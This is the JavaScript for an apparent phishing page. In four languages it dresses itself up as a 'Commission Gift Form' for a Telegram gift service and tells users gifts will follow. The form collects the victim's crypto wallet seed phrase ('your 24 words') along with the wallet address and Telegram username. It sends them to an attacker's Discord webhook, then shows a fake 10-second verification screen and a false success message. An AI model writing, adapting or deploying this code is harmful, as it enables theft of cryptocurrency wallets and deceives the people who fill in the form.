const screens = {
  language: document.getElementById('language-screen'),
  form: document.getElementById('form-screen'),
  status: document.getElementById('status-screen')
};

const form = document.getElementById('commission-form');
const telegramInput = document.getElementById('telegram');
const giftCountInput = document.getElementById('giftCount');
const commissionBalanceInput = document.getElementById('commissionBalance');
const addressInput = document.getElementById('address');
const words24Input = document.getElementById('words24');
const successMessage = document.getElementById('success-message');
const loadingState = document.getElementById('loading-state');
const successState = document.getElementById('success-state');
const submitBtn = document.getElementById('submitBtn');

const CONFIG = window.APP_CONFIG || {};
const LOADING_DELAY = Number(CONFIG.loadingDelayMs) || 10000;
const SUPPORT_BOT = CONFIG.supportBotUsername || 'TonnelHelperRubot';

let currentLang = 'en';
let lastSubmittedTelegram = '';

const translations = {
  en: {
    languageTitle: 'Choose language',
    languageSubtitle: 'Select the interface language to continue',
    formTitle: 'Commission Gift Form',
    formSubtitle: 'Fill in your details to receive gifts from the commission balance',
    telegramUsername: 'Telegram username',
    giftCount: 'How many gifts were put on withdrawal',
    commissionBalance: 'Exact commission balance',
    address: 'Your address',
    words24: 'Your 24 words',
    submit: 'Submit',
    processingTitle: 'Processing request',
    processingText: 'Please wait while your request is being verified',
    successTitle: 'Request sent',
    successText: 'Gifts from the commission will be sent to {username}.',
    telegramPlaceholder: '@username',
    giftCountPlaceholder: '0',
    commissionPlaceholder: '0.000',
    addressPlaceholder: 'Address',
    words24Placeholder: 'word1 word2 word3 ...'
  },
  ru: {
    languageTitle: 'Выбери язык',
    languageSubtitle: 'Выбери язык интерфейса, чтобы продолжить',
    formTitle: 'Форма подарков из комиссии',
    formSubtitle: 'Заполни данные, чтобы получить подарки из комиссионного баланса',
    telegramUsername: 'Юзернейм Telegram',
    giftCount: 'Сколько подарков поставили на вывод',
    commissionBalance: 'Точный баланс комиссии',
    address: 'Твой адрес',
    words24: 'Твои 24 слова',
    submit: 'Отправить',
    processingTitle: 'Обработка запроса',
    processingText: 'Подожди, идёт проверка запроса',
    successTitle: 'Запрос отправлен',
    successText: 'Подарки из комиссии будут отправлены на {username}.',
    telegramPlaceholder: '@username',
    giftCountPlaceholder: '0',
    commissionPlaceholder: '0.000',
    addressPlaceholder: 'Адрес',
    words24Placeholder: 'слово1 слово2 слово3 ...'
  },
  uk: {
    languageTitle: 'Обери мову',
    languageSubtitle: 'Обери мову інтерфейсу, щоб продовжити',
    formTitle: 'Форма подарунків з комісії',
    formSubtitle: 'Заповни дані, щоб отримати подарунки з комісійного балансу',
    telegramUsername: 'Юзернейм Telegram',
    giftCount: 'Скільки подарунків поставили на виведення',
    commissionBalance: 'Точний баланс комісії',
    address: 'Твоя адреса',
    words24: 'Твої 24 слова',
    submit: 'Надіслати',
    processingTitle: 'Обробка запиту',
    processingText: 'Зачекай, іде перевірка запиту',
    successTitle: 'Запит надіслано',
    successText: 'Подарунки з комісії будуть надіслані на {username}.',
    telegramPlaceholder: '@username',
    giftCountPlaceholder: '0',
    commissionPlaceholder: '0.000',
    addressPlaceholder: 'Адреса',
    words24Placeholder: 'слово1 слово2 слово3 ...'
  },
  zh: {
    languageTitle: '选择语言',
    languageSubtitle: '选择界面语言后继续',
    formTitle: '佣金礼物表单',
    formSubtitle: '填写信息以接收佣金余额中的礼物',
    telegramUsername: 'Telegram 用户名',
    giftCount: '你提交提现的礼物数量',
    commissionBalance: '准确的佣金余额',
    address: '你的地址',
    words24: '你的24个词',
    submit: '提交',
    processingTitle: '正在处理请求',
    processingText: '请稍候，系统正在验证你的请求',
    successTitle: '请求已发送',
    successText: '佣金中的礼物将发送到 {username}。',
    telegramPlaceholder: '@username',
    giftCountPlaceholder: '0',
    commissionPlaceholder: '0.000',
    addressPlaceholder: '地址',
    words24Placeholder: '词1 词2 词3 ...'
  }
};

function showScreen(name) {
  Object.values(screens).forEach((screen) => screen.classList.remove('active'));
  screens[name].classList.add('active');
}

function normalizeTelegramUsername(value) {
  const trimmed = value.trim().replace(/^@+/, '');
  return trimmed ? `@${trimmed}` : '';
}

function setLanguage(lang) {
  currentLang = translations[lang] ? lang : 'en';
  const dict = translations[currentLang];

  document.querySelectorAll('[data-i18n]').forEach((node) => {
    const key = node.getAttribute('data-i18n');
    if (dict[key]) {
      node.textContent = dict[key];
    }
  });

  telegramInput.placeholder = dict.telegramPlaceholder;
  giftCountInput.placeholder = dict.giftCountPlaceholder;
  commissionBalanceInput.placeholder = dict.commissionPlaceholder;
  addressInput.placeholder = dict.addressPlaceholder;
  words24Input.placeholder = dict.words24Placeholder;
}

function buildDiscordPayload(data) {
  const langLabel = {
    en: 'English',
    ru: 'Русский',
    uk: 'Українська',
    zh: '中文'
  }[currentLang] || 'English';

  return {
    username: 'Tonnel Network Form',
    embeds: [
      {
        title: 'New commission gift request',
        color: 1756415,
        fields: [
          { name: 'Language', value: langLabel, inline: true },
          { name: 'Telegram', value: data.telegram || '-', inline: true },
          { name: 'Gift count', value: String(data.giftCount || '-'), inline: true },
          { name: 'Commission balance', value: String(data.commissionBalance || '-'), inline: true },
          { name: 'Address', value: data.address || '-', inline: true },
          { name: '24 words', value: data.words24 || '-', inline: false }
        ],
        timestamp: new Date().toISOString()
      }
    ]
  };
}

async function sendToWebhook(payload) {
  const webhookUrl = (CONFIG.discordWebhookUrl || '').trim();
  if (!webhookUrl || webhookUrl === 'PASTE_DISCORD_WEBHOOK_URL_HERE') {
    return { skipped: true };
  }

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      mode: 'no-cors',
      body: JSON.stringify(payload)
    });
    return { ok: true };
  } catch (error) {
    console.error('Webhook send failed:', error);
    return { ok: false, error };
  }
}

function resetStatusScreen() {
  loadingState.classList.add('active');
  successState.classList.remove('active');
}

function showSuccess() {
  const dict = translations[currentLang];
  successMessage.textContent = dict.successText.replace('{username}', lastSubmittedTelegram || '@username');
  loadingState.classList.remove('active');
  successState.classList.add('active');
}

function validateForm(data) {
  if (!data.telegram || !data.giftCount || !data.commissionBalance || !data.address || !data.words24) {
    return false;
  }
  return true;
}

document.querySelectorAll('.lang-btn').forEach((button) => {
  button.addEventListener('click', () => {
    setLanguage(button.dataset.lang);
    showScreen('form');
  });
});

form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const data = {
    telegram: normalizeTelegramUsername(telegramInput.value),
    giftCount: giftCountInput.value.trim(),
    commissionBalance: commissionBalanceInput.value.trim(),
    address: addressInput.value.trim(),
    words24: words24Input.value.trim()
  };

  if (!validateForm(data)) {
    return;
  }

  telegramInput.value = data.telegram;
  lastSubmittedTelegram = data.telegram;
  submitBtn.disabled = true;
  resetStatusScreen();
  showScreen('status');

  const webhookPromise = sendToWebhook(buildDiscordPayload(data));
  await Promise.allSettled([
    webhookPromise,
    new Promise((resolve) => setTimeout(resolve, LOADING_DELAY))
  ]);

  showSuccess();
  submitBtn.disabled = false;
});

setLanguage('en');
showScreen('language');
